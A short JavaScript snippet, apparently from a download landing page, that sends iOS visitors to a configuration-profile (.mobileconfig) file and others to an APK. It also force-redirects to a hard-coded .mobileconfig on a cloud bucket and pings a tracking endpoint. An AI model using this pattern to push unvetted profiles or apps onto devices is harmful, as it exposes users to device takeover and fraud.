function visita() {
	$.ajax({
		url: "./api/attachment_package/getlist",
		dataType: "json",
		success:function(data){
			var u = navigator.userAgent;
			var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
			if (data.meta.code == 0) {
				if (isiOS) {
					window.location.href = data.data.mobileconfig_url;
				} else {
					window.location.href = data.data.apk_url;
				}
			}
		},
	});
	window.location.href = "https://testpcresbx.oss-accelerate.aliyuncs.com/uploads/h5_box2/20250710/e9dd49bbfd0ab7c50d1c1105ed78dbc5.mobileconfig";
}
window.setTimeout("security()", 3000);
function security() {
	$.ajax({
		url: "./tongji/security.php",
		dataType: "jsonp",
	});
}
